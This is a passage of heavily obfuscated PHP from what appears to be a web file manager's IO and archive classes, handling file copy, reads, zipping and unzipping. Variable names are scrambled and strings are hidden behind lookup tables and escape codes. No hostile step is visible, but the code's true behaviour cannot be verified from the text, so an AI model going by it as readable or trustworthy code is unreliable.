as $×â±­„ => $òóÓóñÎ) { if (isset($”«‚Êíí[$×â±­„])) { if ($òóÓóñÎ[$®ß…åÇâ[78]] == 1) { continue; } if ($”«‚Êíí[$×â±­„][$®ß…åÇâ[79]] == $òóÓóñÎ[$®ß…åÇâ[79]]) { continue; } } if ($òóÓóñÎ[$®ß…åÇâ[78]] == 1) { $«ä¬­³ƒ[] = $±¾İ ŞÇ . $®ß…åÇâ[8] . trim($×â±­„, $®ß…åÇâ[8]); continue; } $÷ã¹Í¤¨ = strstr(trim($×â±­„, $®ß…åÇâ[8]), $®ß…åÇâ[8]) ? get_path_father($×â±­„) : $®ß…åÇâ[12]; $ïõí–Ìİ[] = array($®ß…åÇâ[1249] => $òóÓóñÎ[$®ß…åÇâ[89]], $®ß…åÇâ[1250] => rtrim($±¾İ ŞÇ, $®ß…åÇâ[8]) . $®ß…åÇâ[8] . $÷ã¹Í¤¨, $®ß…åÇâ[1251] => $òóÓóñÎ); } $Ş°âÂƒ¨ = array($®ß…åÇâ[230] => $ïõí–Ìİ, $®ß…åÇâ[78] => $«ä¬­³ƒ); Hook::trigger($®ß…åÇâ[1252], $¿ìÃğóˆ, $±¾İ ŞÇ, $Ş°âÂƒ¨); foreach ($«ä¬­³ƒ as $òóÓóñÎ) { IO::mkdir($òóÓóñÎ); } foreach ($ïõí–Ìİ as $òóÓóñÎ) { IO::copy($òóÓóñÎ[$®ß…åÇâ[1249]], $òóÓóñÎ[$®ß…åÇâ[1250]], REPEAT_REPLACE); } } public static function fileSubstr($˜ôû¬Üû, $¯©ĞÑºÔ, $‹…¦®† = false) { $Î€Ö˜¸ =& $_SERVER[²Ö÷öõ]; $ôş‚âË— = self::driverMake($˜ôû¬Üû); $×Õ„æôß = $ôş‚âË—->size($˜ôû¬Üû); $çõ·¹á = $¯©ĞÑºÔ; $î³î±£ã = $‹…¦®†; if ($¯©ĞÑºÔ < 0) { $¯©ĞÑºÔ = $×Õ„æôß + $¯©ĞÑºÔ; } if ($‹…¦®† === !1) { $‹…¦®† = $×Õ„æôß - $¯©ĞÑºÔ; } if ($¯©ĞÑºÔ + $‹…¦®† > $×Õ„æôß) { $‹…¦®† = $×Õ„æôß - $¯©ĞÑºÔ; } if (!$×Õ„æôß && $ôş‚âË—->getType() == $Î€Ö˜¸[109] && !$ôş‚âË—->exist($˜ôû¬Üû)) { $–è™‚œü = get_path_this($˜ôû¬Üû); $ú»éé‡Õ = parse_url_query($–è™‚œü); if (is_array($ú»éé‡Õ) && isset($ú»éé‡Õ[$Î€Ö˜¸[32]])) { $–è™‚œü = urldecode($ú»éé‡Õ[$Î€Ö˜¸[32]]); } throw new Exception($Î€Ö˜¸[1253] . LNG($Î€Ö˜¸[1254]) . $Î€Ö˜¸[1052] . clear_html($–è™‚œü) . $Î€Ö˜¸[12]); } if ($‹…¦®† <= 0) { return $Î€Ö˜¸[12]; } if ($¯©ĞÑºÔ < 0 || $¯©ĞÑºÔ >= $×Õ„æôß || $‹…¦®† > 1024 * 1024 * 10) { throw new Exception("\x66\x69\154\x65\x52\145\x61\144\40\x65\x72\162\157\x72\x21\x20\x73\x74\x61\x72\164\75{$¯©ĞÑºÔ}\x3b\x6c\145\156\x67\164\150\x3d{$‹…¦®†}\x3b\x20\163\x69\172\145\75{$×Õ„æôß}\73"); } $ïğá£ = $ôş‚âË—->fileSubstr($˜ôû¬Üû, $¯©ĞÑºÔ, $‹…¦®†); if (!$ïğá£ && $‹…¦®† && isset($GLOBALS[$Î€Ö˜¸[1255]])) { throw new Exception($GLOBALS[$Î€Ö˜¸[1255]][$Î€Ö˜¸[1256]]); } return $ïğá£; } private static function driverMake(&$ÄÎ·Ê„Ã) { $øßúÊ€Ö =& $_SERVER[²Ö÷öõ]; $ìåïïËî = KodIO::parse($ÄÎ·Ê„Ã); if (!self::$driverListSystem) { $°²½ûÂì = Model($øßúÊ€Ö[850])->driverListSystem(); self::$driverListSystem = array_to_keyvalue($°²½ûÂì, $øßúÊ€Ö[475]); } if ($ìåïïËî[$øßúÊ€Ö[33]] == KodIO::KOD_IO && !self::$driverListSystem[$ìåïïËî[$øßúÊ€Ö[475]]]) { throw new Exception($øßúÊ€Ö[1257]); return !1; } $ÄÎ·Ê„Ã = $ìåïïËî[$øßúÊ€Ö[1258]]; $Í×ªÕ¬½ = self::driverGet($ìåïïËî, $ÄÎ·Ê„Ã); return $Í×ªÕ¬½; } private static function driverGet($Ùò½«ä›, &$Ëë—”½”) { $šÆñêò† =& $_SERVER[²Ö÷öõ]; $—•”‡Ù® = $Ùò½«ä›[$šÆñêò†[1259]]; $º…¯Ï¶Ñ = $Ùò½«ä›[$šÆñêò†[475]]; switch ($Ùò½«ä›[$šÆñêò†[33]]) { case KodIO::KOD_IO: $Ş£œŞ„Æ = self::$driverListSystem[$º…¯Ï¶Ñ]; break; case KodIO::KOD_SOURCE: $Ëë—”½” = $º…¯Ï¶Ñ . $Ëë—”½”; $Ş£œŞ„Æ = array($šÆñêò†[1260] => $šÆñêò†[1261], $šÆñêò†[6] => $Ùò½«ä›); break; case KodIO::KOD_USER_DRIVER: if (!self::$driverListUser) { $èö»¸ÙÇ = $GLOBALS[$šÆñêò†[1262]]; self::$driverListUser = array_to_keyvalue($èö»¸ÙÇ, $šÆñêò†[475]); } $Ş£œŞ„Æ = self::$driverListUser[$º…¯Ï¶Ñ]; break; case KodIO::KOD_SHARE_LINK: $Ş£œŞ„Æ = array($šÆñêò†[1260] => $šÆñêò†[1263], $šÆñêò†[6] => $Ùò½«ä›); $êŸ®Íå = Action($šÆñêò†[1264])->sharePathInfo($Ùò½«ä›[$šÆñêò†[87]]); $Ëë—”½” = $êŸ®Íå[$šÆñêò†[193]]; if (!$êŸ®Íå[$šÆñêò†[193]]) { $¸ûÔÅ”É = Model($šÆñêò†[664])->getInfo($êŸ®Íå[$šÆñêò†[665]]); $Ëë—”½” = KodIO::clear($¸ûÔÅ”É[$šÆñêò†[1265]] . $Ùò½«ä›[$šÆñêò†[1258]]); $Ùò½«ä›[$šÆñêò†[560]] = $¸ûÔÅ”É; $Ùò½«ä›[$šÆñêò†[1240]] = $Ëë—”½”; $Ş£œŞ„Æ = array($šÆñêò†[1260] => $šÆñêò†[1266], $šÆñêò†[6] => $Ùò½«ä›); } break; case KodIO::KOD_SHARE_ITEM: $Ş£œŞ„Æ = array($šÆñêò†[1260] => $šÆñêò†[1267], $šÆñêò†[6] => $Ùò½«ä›); $¸ûÔÅ”É = Model($šÆñêò†[664])->getInfo($Ùò½«ä›[$šÆñêò†[475]]); if ($¸ûÔÅ”É[$šÆñêò†[193]] == $šÆñêò†[228]) { $Ëë—”½” = KodIO::clear($¸ûÔÅ”É[$šÆñêò†[1265]] . $Ùò½«ä›[$šÆñêò†[1258]]); $Ùò½«ä›[$šÆñêò†[560]] = $¸ûÔÅ”É; $Ùò½«ä›[$šÆñêò†[1240]] = $Ëë—”½”; $Ş£œŞ„Æ = array($šÆñêò†[1260] => $šÆñêò†[1268], $šÆñêò†[6] => $Ùò½«ä›); } else { if (!$Ëë—”½”) { $Ëë—”½” = $¸ûÔÅ”É[$šÆñêò†[193]]; } } break; default: $Ëë—”½” = $Ùò½«ä›[$šÆñêò†[87]]; $Ş£œŞ„Æ = array($šÆñêò†[1260] => $šÆñêò†[1269]); break; } $Ï±»©Ù® = $Ùò½«ä›[$šÆñêò†[87]]; if (!isset(self::$driverCache[$Ï±»©Ù®])) { $ÇËµ—ß° = strtolower($Ş£œŞ„Æ[$šÆñêò†[98]]); $ùö¨–£é = $GLOBALS[$šÆñêò†[6]][$šÆñêò†[92]][$šÆñêò†[908]]; $öÑŞ…Ã¿ = $šÆñêò†[77] . (isset($ùö¨–£é[$ÇËµ—ß°]) ? $ùö¨–£é[$ÇËµ—ß°] : ucfirst($ÇËµ—ß°)); if (!class_exists($öÑŞ…Ã¿)) { show_json("{$öÑŞ…Ã¿}\x20\156\157\164\x20\x65\170\x69\x73\x74\x73\41", !1); } $š†ÊÔ¹  = isset($Ş£œŞ„Æ[$šÆñêò†[6]]) ? $Ş£œŞ„Æ[$šÆñêò†[6]] : !1; self::$driverCache[$Ï±»©Ù®] = new $öÑŞ…Ã¿($š†ÊÔ¹ ); } $Ñ—Ï†Øâ = self::$driverCache[$Ï±»©Ù®]; $Ñ—Ï†Øâ->pathDriver = $—•”‡Ù®; $Ñ—Ï†Øâ->pathBase = $šÆñêò†[12]; if (isset($Ş£œŞ„Æ[$šÆñêò†[6]][$šÆñêò†[1270]])) { $Ñ—Ï†Øâ->pathBase = rtrim($Ş£œŞ„Æ[$šÆñêò†[6]][$šÆñêò†[1270]], $šÆñêò†[8]) . $šÆñêò†[8]; $Ëë—”½” = $Ñ—Ï†Øâ->pathBase . ltrim($Ëë—”½”, $šÆñêò†[8]); } $Ëë—”½” = $Ñ—Ï†Øâ->getPath($Ëë—”½”); if (isset($Ùò½«ä›[$šÆñêò†[1240]])) { $Ëë—”½” = $Ùò½«ä›[$šÆñêò†[1240]]; } $Ñ—Ï†Øâ->path = $Ëë—”½”; return $Ñ—Ï†Øâ; } public static function errorTips($í²°òá = false) { $”¨Òã» =& $_SERVER[²Ö÷öõ]; static $œ¼õ±˜° = array(); $®«Ğ½ùò = 1000; if ($í²°òá === -1) { return $œ¼õ±˜° ? $œ¼õ±˜°[count($œ¼õ±˜°) - 1] : $”¨Òã»[12]; } if ($í²°òá === !1) { return implode($”¨Òã»[262], $œ¼õ±˜°); } if (count($œ¼õ±˜°) >= $®«Ğ½ùò) { $œ¼õ±˜° = array_slice($œ¼õ±˜°, $®«Ğ½ùò * 0.5, $®«Ğ½ùò); } $œ¼õ±˜°[] = $í²°òá; write_log($”¨Òã»[176] . ACTION . $”¨Òã»[1271] . $í²°òá, $”¨Òã»[1272]); } public static function getLastError($©ë€¥ò« = '') { $äÓ‡İ›€ = self::errorTips(-1); return $äÓ‡İ›€ ? $äÓ‡İ›€ : $©ë€¥ò«; } } class IOArchive extends IO { function __construct() { parent::__construct(); } private static function local() { static $èú î; if ($èú î) { return $èú î; } $©Íîæ÷Š = IO::init($_SERVER[²Ö÷öõ][8]); return $©Íîæ÷Š; } private static function iconvSystem($¤“…óƒß) { return self::local()->iconvSystem($¤“…óƒß); } private static function iconvApp($°æÎôÅø) { return self::local()->iconvApp($°æÎôÅø); } public static function zipFolder($ª±¬ÌÒ£, $•õÛ¦–Ô = "\172\x69\160", $‚¨‘‡ˆË = '', $ËÈê¡¡¹ = REPEAT_RENAME) { $«ìèÔ =& $_SERVER[²Ö÷öõ]; $ùÂ®Öá = IO::listPath($ª±¬ÌÒ£); if (!$ùÂ®Öá) { return !1; } $ùÂ®Öá = array_merge($ùÂ®Öá[$«ìèÔ[85]], $ùÂ®Öá[$«ìèÔ[86]]); return self::zip($ùÂ®Öá, $•õÛ¦–Ô, $‚¨‘‡ˆË, $ËÈê¡¡¹); } public static function zip($ÑŞÅ‡«, $íÚŸëĞó = "\x7a\151\x70", $²ôÚˆ³ = '', $ìÒË’¹è = REPEAT_RENAME) { $“«¨ñÓ’ =& $_SERVER[²Ö÷öõ]; if (is_string($ÑŞÅ‡«) && $ÑŞÅ‡«) { $ÑŞÅ‡« = array(array($“«¨ñÓ’[87] => $ÑŞÅ‡«)); } $Ã—ˆ¤óá = self::init($ÑŞÅ‡«[0][$“«¨ñÓ’[87]]); $¬ûı½Ë = self::info($ÑŞÅ‡«[0][$“«¨ñÓ’[87]]); $ÍÕˆ¹Õæ = $“«¨ñÓ’[12]; $€€·æş = $“«¨ñÓ’[12]; $¥ºûéÈ½ = $“«¨ñÓ’[12]; if ($²ôÚˆ³ && substr($²ôÚˆ³, -1, 1) != $“«¨ñÓ’[8]) { $€€·æş = get_path_father($²ôÚˆ³); $¥ºûéÈ½ = get_path_this($²ôÚˆ³); } else { $€€·æş = self::pathFather($¬ûı½Ë[$“«¨ñÓ’[87]]); $¥ºûéÈ½ = $¬ûı½Ë[$“«¨ñÓ’[32]] . $“«¨ñÓ’[10] . $íÚŸëĞó; if (count($ÑŞÅ‡«) > 1) { $¡¤º÷øÍ = IO::info($€€·æş); $¥ºûéÈ½ = $¡¤º÷øÍ[$“«¨ñÓ’[32]] . $“«¨ñÓ’[10] . $íÚŸëĞó; } if ($²ôÚˆ³) { $€€·æş = $²ôÚˆ³; } } if ($Ã—ˆ¤óá->getType() == $“«¨ñÓ’[109]) { $›ßƒõ­Š = self::init($€€·æş); $­¢™¹µö = $›ßƒõ­Š->getType() == $“«¨ñÓ’[109] ? $€€·æş : get_path_father($Ã—ˆ¤óá->path); $­¢™¹µö = rtrim($­¢™¹µö, $“«¨ñÓ’[8]) . $“«¨ñÓ’[8]; mk_dir($­¢™¹µö); } else { $ÍÕˆ¹Õæ = TEMP_FILES . $“«¨ñÓ’[1273] . time() . rand_string(8) . $“«¨ñÓ’[8]; mk_dir($ÍÕˆ¹Õæ); file_put_contents($ÍÕˆ¹Õæ . $“«¨ñÓ’[1274], $“«¨ñÓ’[12]); $­¢™¹µö = $ÍÕˆ¹Õæ; } $ß§¡¿æ™ = IO::info($­¢™¹µö); if (!$ß§¡¿æ™ || !$ß§¡¿æ™[$“«¨ñÓ’[233]]) { show_json(LNG($“«¨ñÓ’[1275]), !1); } $…‹ïûÅÃ = self::zipFileList($ÑŞÅ‡«, $ÍÕˆ¹Õæ); foreach ($…‹ïûÅÃ as $˜ùœ„âõ => $º“ôÖê) { $…‹ïûÅÃ[$˜ùœ„âõ] = self::iconvSystem($º“ôÖê); } $èóØá¼È = get_filename_auto($­¢™¹µö . $¥ºûéÈ½, $“«¨ñÓ’[12], $ìÒË’¹è); KodArchive::create(self::iconvSystem($èóØá¼È), $…‹ïûÅÃ); if (!IO::exist($èóØá¼È)) { if ($ÍÕˆ¹Õæ) { del_dir($ÍÕˆ¹Õæ); } write_log($“«¨ñÓ’[1276] . $èóØá¼È, $“«¨ñÓ’[389]); show_json(LNG($“«¨ñÓ’[1277]), !1); } if (!$ÍÕˆ¹Õæ) { return $èóØá¼È; } $ÅŞªÛ‡ = self::move($èóØá¼È, $€€·æş, $ìÒË’¹è); if ($ÍÕˆ¹Õæ) { del_dir($ÍÕˆ¹Õæ); } if (!$èóØá¼È) { write_log($“«¨ñÓ’[1278] . $èóØá¼È . $“«¨ñÓ’[1279] . $€€·æş, $“«¨ñÓ’[389]); show_json(LNG($“«¨ñÓ’[1277]), !1); } return $ÅŞªÛ‡; } public static function unzip($ÆÈÌœ¹«, $‡˜»™Šú, $ıµÌŒŸ = "\x2d\x31", $–³‰¿Ö = "\162\145\160\x6c\x61\x63\145") { $ÛïªÆ¨³ =& $_SERVER[²Ö÷öõ]; $©½ö±ÆÆ = parent::info($ÆÈÌœ¹«); if (!$©½ö±ÆÆ) { show_json(LNG($ÛïªÆ¨³[1280]), !1); } $²„úÏ–ò = IO::infoFullSimple($‡˜»™Šú); if (!$²„úÏ–ò) { $‡˜»™Šú = IO::mkdir($‡˜»™Šú); } if (isset($²„úÏ–ò[$ÛïªÆ¨³[193]]) && trim($²„úÏ–ò[$ÛïªÆ¨³[87]], $ÛïªÆ¨³[8]) != trim($‡˜»™Šú, $ÛïªÆ¨³[8])) { $¢‚ØœÕÎ = KodIO::make($²„úÏ–ò[$ÛïªÆ¨³[192]]); $ñ§²ÙêŞ = IO::fileNameAuto($¢‚ØœÕÎ, $²„úÏ–ò[$ÛïªÆ¨³[32]], REPEAT_RENAME_FOLDER, !0); $‡˜»™Šú = IO::mkdir($¢‚ØœÕÎ . $ñ§²ÙêŞ); } $ıµÌŒŸ = $ıµÌŒŸ && $ıµÌŒŸ != $ÛïªÆ¨³[1281] ? @json_decode($ıµÌŒŸ, !0) : -1; $ëóÁ¬ö = self::unzipPart($ÆÈÌœ¹«, $ıµÌŒŸ); if (!$ëóÁ¬ö || !IO::exist($ëóÁ¬ö[$ÛïªÆ¨³[230]])) { show_json(LNG($ÛïªÆ¨³[108]), !1); } $é‡£Øæç = $ëóÁ¬ö[$ÛïªÆ¨³[1282]][count($ëóÁ¬ö[$ÛïªÆ¨³[1282]]) - 1]; if ($é‡£Øæç[$ÛïªÆ¨³[1283]] == -1 || substr($é‡£Øæç[$ÛïªÆ¨³[32]], -1, 1) == $ÛïªÆ¨³[8]) { $ÉÑÑÙ©Ç = $ëóÁ¬ö[$ÛïªÆ¨³[1284]] . rand_string(10) . $ÛïªÆ¨³[8]; mk_dir($ÉÑÑÙ©Ç); $Á€åšç = count($ëóÁ¬ö[$ÛïªÆ¨³[1282]]) == 1 ? IO::ext($ÆÈÌœ¹«) : get_path_ext($ëóÁ¬ö[$ÛïªÆ¨³[230]]); $³¼©Ç€Ğ = KodArchive::extract(self::iconvSystem($ëóÁ¬ö[$ÛïªÆ¨³[230]]), $ÉÑÑÙ©Ç, $é‡£Øæç[$ÛïªÆ¨³[1283]], $ñ§²ÙêŞ, $Á€åšç); self::unzipErrorCheck($³¼©Ç€Ğ, array($ÛïªÆ¨³[1285], $ÆÈÌœ¹«, $Á€åšç, $‡˜»™Šú, $ëóÁ¬ö)); Hook::trigger($ÛïªÆ¨³[1286], $ÉÑÑÙ©Ç); recursion_dir($ÉÑÑÙ©Ç, $ûƒßİçÍ, $½¤¦ô×¸, 0); $¢è®çÈ = array_merge($ûƒßİçÍ, $½¤¦ô×¸); $ŸíƒŸÛ˜ = array(); foreach ($¢è®çÈ as $®Õ†Í²ˆ) { $Õ“ÎúÙ = IO::move(self::iconvApp($®Õ†Í²ˆ), $‡˜»™Šú, $–³‰¿Ö); if ($Õ“ÎúÙ) { $ŸíƒŸÛ˜[] = $Õ“ÎúÙ; } } del_dir($ÉÑÑÙ©Ç); } else { $Õ“ÎúÙ = IO::move($ëóÁ¬ö[$ÛïªÆ¨³[230]], $‡˜»™Šú, $–³‰¿Ö, get_path_this($é‡£Øæç[$ÛïªÆ¨³[32]])); if ($Õ“ÎúÙ) { $ŸíƒŸÛ˜[] = $Õ“ÎúÙ; } } return $ŸíƒŸÛ˜ ? $ŸíƒŸÛ˜ : !1; } public static function unzipList($ÃÖŠşı‡) { $İ¢¡ì¬ =& $_SERVER[²Ö÷öõ]; $‚ÜÖËª¨ = isset($ÃÖŠşı‡[$İ¢¡ì¬[1287]]) ? $ÃÖŠşı‡[$İ¢¡ì¬[1287]] : !1; $Ñ«Üñıó = isset($ÃÖŠşı‡[$İ¢¡ì¬[1283]]) ? @json_decode($ÃÖŠşı‡[$İ¢¡ì¬[1283]], !0) : -1; $í²•ô‹Ü = self::unzipPart($ÃÖŠşı‡[$İ¢¡ì¬[87]], $Ñ«Üñıó); if (!$í²•ô‹Ü || !IO::exist($í²•ô‹Ü[$İ¢¡ì¬[230]])) { show_json(LNG($İ¢¡ì¬[108]), !1); } $¯Ìãû = $í²•ô‹Ü[$İ¢¡ì¬[1282]][count($í²•ô‹Ü[$İ¢¡ì¬[1282]]) - 1]; $ÀöÏ´…• = in_array(IO::ext($í²•ô‹Ü[$İ¢¡ì¬[230]]), array($İ¢¡ì¬[389], $İ¢¡ì¬[1288], $İ¢¡ì¬[1289], $İ¢¡ì¬[1290], $İ¢¡ì¬[1291], $İ¢¡ì¬[1292])); if (!$‚ÜÖËª¨ && ($¯Ìãû[$İ¢¡ì¬[1283]] == -1 || $ÀöÏ´…•)) { $‚ê¦ğšã = $í²•ô‹Ü[$İ¢¡ì¬[1284]] . get_path_this($í²•ô‹Ü[$İ¢¡ì¬[230]]) . $İ¢¡ì¬[1293]; if (!IO::exist($‚ê¦ğšã)) { $•éëö” = $¯Ìãû[$İ¢¡ì¬[1283]] == -1 ? get_path_ext(IO::pathThis($ÃÖŠşı‡[$İ¢¡ì¬[87]])) : get_path_ext($í²•ô‹Ü[$İ¢¡ì¬[230]]); $ÏİìØê† = KodArchive::listContent(self::iconvSystem($í²•ô‹Ü[$İ¢¡ì¬[230]]), !0, $•éëö”); self::unzipErrorCheck($ÏİìØê†, array($İ¢¡ì¬[1294], $ÃÖŠşı‡, $í²•ô‹Ü)); @file_put_contents($‚ê¦ğšã, json_encode($ÏİìØê†[$İ¢¡ì¬[1295]])); } return @json_decode(IO::getContent($‚ê¦ğšã), !0); } IO::fileOut($í²•ô‹Ü[$İ¢¡ì¬[230]], $‚ÜÖËª¨, get_path_this($¯Ìãû[$İ¢¡ì¬[32]])); die; } private static function zipFileList($¯Õ…”üû, $—ÀıòèŸ = false) { $ÙÖ™öÛÙ =& $_SERVER[²Ö÷öõ]; $Î­üÍ = array(); foreach ($¯Õ…”üû as $ÏÆÖÀãÍ) { $ß“õè•¸ = $ÏÆÖÀãÍ[$ÙÖ™öÛÙ[87]]; if ($—ÀıòèŸ) { $ß“õè•¸ = self::copy($ÏÆÖÀãÍ[$ÙÖ™öÛÙ[87]], $—ÀıòèŸ, $ÙÖ™öÛÙ[901]); } else { $İ¯¯§÷Û = self::init($ÏÆÖÀãÍ[$ÙÖ™öÛÙ[87]]); if ($İ¯¯§÷Û->getType() == $ÙÖ™öÛÙ[109]) { $ß“õè•¸ = $İ¯¯§÷Û->path; } } if ($ß“õè•¸ && self::local()->exist($ß“õè•¸)) { $Î­üÍ[$ÏÆÖÀãÍ[$ÙÖ™öÛÙ[87]]] = $ß“õè•¸; } } if (!empty($Î­üÍ)) { return array_values($Î­üÍ); } show_json(LNG($ÙÖ™öÛÙ[1254]), !1); } private static function localFilePath($´’¨Ç¿Ë) { $îÀ ğ¾Ş =& $_SERVER[²Ö÷öõ]; $…Å¸ºÉü = KodIO::parse($´’¨Ç¿Ë); if ($…Å¸ºÉü[$îÀ ğ¾Ş[33]] == KodIO::KOD_SOURCE) { $¥ÌŒóé = Model($îÀ ğ¾Ş[907])->fileInfoGet(KodIO::sourceID($´’¨Ç¿Ë)); if (!$¥ÌŒóé[$îÀ ğ¾Ş[87]]) { show_json($îÀ ğ¾Ş[1296], !1); } $´’¨Ç¿Ë = $¥ÌŒóé[$îÀ ğ¾Ş[87]]; } $§œÄÅß§ = self::init($´’¨Ç¿Ë); if ($§œÄÅß§->pathParse[$îÀ ğ¾Ş[1240]]) { $´’¨Ç¿Ë = $§œÄÅß§->pathParse[$îÀ ğ¾Ş[1240]]; $§œÄÅß§ = self::init($´’¨Ç¿Ë); } $êıˆÎ–÷ = $§œÄÅß§->getType(); if ($êıˆÎ–÷ == $îÀ ğ¾Ş[109] || $êıˆÎ–÷ == $îÀ ğ¾Ş[1297]) { if (!$§œÄÅß§->exist($§œÄÅß§->path)) { show_json(LNG($îÀ ğ¾Ş[108]), !1); } return $§œÄÅß§->path; } return !1; } public static function unzipPart($Ù½¨Åó, $¥ÀäÉ°Š = -1) { $Ù¦óÚ– =& $_SERVER[²Ö÷öõ]; $Å¥‡ªÁ = IO::pathThis($Ù½¨Åó); if (!$¥ÀäÉ°Š || $¥ÀäÉ°Š == -1) { $²øĞ²ì = array(array($Ù¦óÚ–[32] => $Å¥‡ªÁ, $Ù¦óÚ–[1283] => -1)); $²øĞ²ì[0][$Ù¦óÚ–[1298]] = $²øĞ²ì[0][$Ù¦óÚ–[32]]; } else { if (is_array($¥ÀäÉ°Š)) { $²øĞ²ì = $¥ÀäÉ°Š; $’¿Ó€ – = count($²øĞ²ì) - 1; for ($Óöî·ˆÜ = 0; $Óöî·ˆÜ <= $’¿Ó€ –; $Óöî·ˆÜ++) { $Š¬ÁÆ = $²øĞ²ì[$Óöî·ˆÜ]; $äÆúÙÍä = get_path_this($Š¬ÁÆ[$Ù¦óÚ–[32]]) . (checkExtSafe($Š¬ÁÆ[$Ù¦óÚ–[32]]) ? $Ù¦óÚ–[12] : $Ù¦óÚ–[1299]); $²øĞ²ì[$Óöî·ˆÜ][$Ù¦óÚ–[1298]] = $Ù¦óÚ–[1300] . intval($Š¬ÁÆ[$Ù¦óÚ–[1283]]) . $Ù¦óÚ–[462] . $äÆúÙÍä; if ($Óöî·ˆÜ == 0) { continue; } $²øĞ²ì[$Óöî·ˆÜ][$Ù¦óÚ–[1298]] = $²øĞ²ì[$Óöî·ˆÜ - 1][$Ù¦óÚ–[1298]] . $Ù¦óÚ–[1301] . $²øĞ²ì[$Óöî·ˆÜ][$Ù¦óÚ–[1298]]; } } } if (!is_array($²øĞ²ì) || count($²øĞ²ì) == 0) { return !1; } $Ñ˜’Ìœæ = $²øĞ²ì[count($²øĞ²ì) - 1]; if (!IO::exist($Ù½¨Åó)) { return !1; } $Û€¥ï‘ = TEMP_FILES . $Ù¦óÚ–[1302] . kodIO::hashPathSafe($Ù½¨Åó) . $Ù¦óÚ–[8]; $Íí˜ìë‰ = $Û€¥ï‘ . $Ñ˜’Ìœæ[$Ù¦óÚ–[1298]]; mk_dir($Û€¥ï‘); file_put_contents(TEMP_FILES . $Ù¦óÚ–[1274], $Ù¦óÚ–[12]); if (IO::exist($Íí˜ìë‰)) { return array($Ù¦óÚ–[230] => $Íí˜ìë‰, $Ù¦óÚ–[1282] => $²øĞ²ì, $Ù¦óÚ–[1284] => $Û€¥ï‘); } $ââ¨Äéº = self::localFilePath($Ù½¨Åó); if (!$ââ¨Äéº) { $ââ¨Äéº = $Û€¥ï‘ . $Ù¦óÚ–[1303]; if (!IO::exist($ââ¨Äéº)) { self::copy($Ù½¨Åó, $Û€¥ï‘, !1, get_path_this($ââ¨Äéº)); } } if (!$ââ¨Äéº || !IO::exist($ââ¨Äéº)) { return !1; } if ($Ñ˜’Ìœæ[$Ù¦óÚ–[1283]] == -1) { return array($Ù¦óÚ–[230] => $ââ¨Äéº, $Ù¦óÚ–[1282] => $²øĞ²ì, $Ù¦óÚ–[1284] => $Û€¥ï‘); } $î¾„Ú‡ = $ââ¨Äéº; foreach ($²øĞ²ì as $Óöî·ˆÜ => $Š¬ÁÆ) { if (!$Š¬ÁÆ || $Š¬ÁÆ[$Ù¦óÚ–[1283]] == $Ù¦óÚ–[1281]) { break; } if (substr($Š¬ÁÆ[$Ù¦óÚ–[32]], -1, 1) == $Ù¦óÚ–[8]) { break; } $®Ìò¥ãú = in_array(get_path_ext($Š¬ÁÆ[$Ù¦óÚ–[1298]]), array($Ù¦óÚ–[389], $Ù¦óÚ–[1288], $Ù¦óÚ–[1289], $Ù¦óÚ–[1290], $Ù¦óÚ–[1291], $Ù¦óÚ–[1292])); $Ğ¤ëòàé = $Óöî·ˆÜ == count($²øĞ²ì) - 1 && $®Ìò¥ãú; $ü¹¡ùû = $Û€¥ï‘ . $Š¬ÁÆ[$Ù¦óÚ–[1298]]; $ò¸ª°¤— = $Û€¥ï‘ . get_path_this($Š¬ÁÆ[$Ù¦óÚ–[32]]); if (IO::exist($ü¹¡ùû)) { $î¾„Ú‡ = $ü¹¡ùû; continue; } $¯œ«’œí = $Óöî·ˆÜ == 0 ? get_path_ext($Å¥‡ªÁ) : get_path_ext($î¾„Ú‡); $ÆšÑğªô = KodArchive::extract(self::iconvSystem($î¾„Ú‡), $Û€¥ï‘, $Š¬ÁÆ[$Ù¦óÚ–[1283]], $—»İë…, $¯œ«’œí); self::unzipErrorCheck($ÆšÑğªô, array($Ù¦óÚ–[1304], $Ù½¨Åó, $²øĞ²ì, $Š¬ÁÆ, $ü¹¡ùû)); if (IO::exist($ò¸ª°¤—)) { IO::rename($ò¸ª°¤—, get_path_this($ü¹¡ùû)); } $î¾„Ú‡ = $ü¹¡ùû; } $Íí˜ìë‰ = $î¾„Ú‡; return array($Ù¦óÚ–[230] => $î¾„Ú‡, $Ù¦óÚ–[1282] => $²øĞ²ì, $Ù¦óÚ–[1284] => $Û€¥ï‘); } private static function unzipErrorCheck($´ºØªŠ, $ƒÂ“à¤“ = false) { $¢¤‚ù­ =& $_SERVER[²Ö÷öõ]; if ($´ºØªŠ[$¢¤‚ù­[1305]]) { return !0; } write_log(array($¢¤‚ù­[1306], $´ºØªŠ, $ƒÂ“à¤“), $¢¤‚ù­[1307]); show_json($¢¤‚ù­[1308] . json_encode($´ºØªŠ[$¢¤‚ù­[1295]]), !1); die; } } $_file = $_SERVER[$_SERVER[²Ö÷öõ][960]]; goto c„¸Œš™±Õ; EÙ×¸ôá: class PathDriverStream extends PathDriverBase { const TYPE_STRING = 1; const TYPE_FILE = 2; public function __construct($É‡’Åü, $õ¸ªÉÅ» = 0) { parent::__construct(); $this->source = $É‡’Åü; $this->sourceSize = $õ¸ªÉÅ»; if (is_string($this->source)) { $this->sourceType = self::TYPE_STRING; $this->sourceSize = strlen($this->source); } else { $this->sourceType = self::TYPE_FILE; } } public function size($ñÊ®Æİı = false) { return $this->sourceSize; } public function getContent($¢ºú¤Æ­ = false) { return $this->fileSubstr($¢ºú¤Æ­, 0, $this->sourceSize); } public function fileSubstr($ıËÇ†àä = false, $ú¨Æ² = 0, $»ÙÛËª— = 0) { if (!$»ÙÛËª—) { $»ÙÛËª— = $this->sourceSize; } $²Ö®ü´ = $this->sourceSize - $ú¨Æ²; if ($»ÙÛËª— >= $²Ö®ü´) { $»ÙÛËª— = $²Ö®ü´; } if ($this->sourceType == self::TYPE_STRING) { return substr($this->source, $ú¨Æ², $»ÙÛËª—); } if ($this->sourceType == self::TYPE_FILE) { if ($»ÙÛËª— <= 0) { return $_SERVER[²Ö÷öõ][12]; } $ê¾¸ÍÜú = ftell($this->source); fseek_64($this->source, $ê¾¸ÍÜú + $ú¨Æ²); $ œ›Àé = @fread($this->source, $»ÙÛËª—); fseek_64($this->source, $ê¾¸ÍÜú); return $ œ›Àé; } } public function hashMd5($’õâçÌÙ = false) { return md5($this->getContent()); } public static function hash($ö’‹¸¨È, $Ã¹ƒå¢ü = 0) { $ÕŞÀÎ÷ = new PathDriverStream($ö’‹¸¨È, $Ã¹ƒå¢ü); return $ÕŞÀÎ÷->hashSimple($ö’‹¸¨È); } public static function md5($ºú±‹³ñ, $ï÷œú¯£ = 0) { 